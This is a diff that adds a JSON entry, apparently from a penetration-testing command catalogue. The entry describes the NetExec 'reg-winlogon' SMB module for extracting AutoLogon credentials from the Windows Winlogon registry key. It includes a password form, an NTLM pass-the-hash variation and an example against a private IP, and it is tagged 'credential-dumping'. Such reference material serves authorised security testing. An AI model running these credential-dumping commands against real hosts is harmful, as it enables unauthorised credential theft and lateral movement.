@@ -1,0 +1,31 @@
+{
+  "id": "nxc-smb-winlogon",
+  "name": "NetExec SMB Winlogon Credentials",
+  "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M reg-winlogon",
+  "description": "Extract AutoLogon credentials from the Winlogon registry key on remote hosts",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "nxc",
+    "smb",
+    "winlogon",
+    "autologon",
+    "registry",
+    "credential-dumping"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M reg-winlogon"
+    }
+  ],
+  "examples": [
+    "nxc smb '192.168.1.100' -u 'administrator' -p 'password' -M reg-winlogon"
+  ]
+}
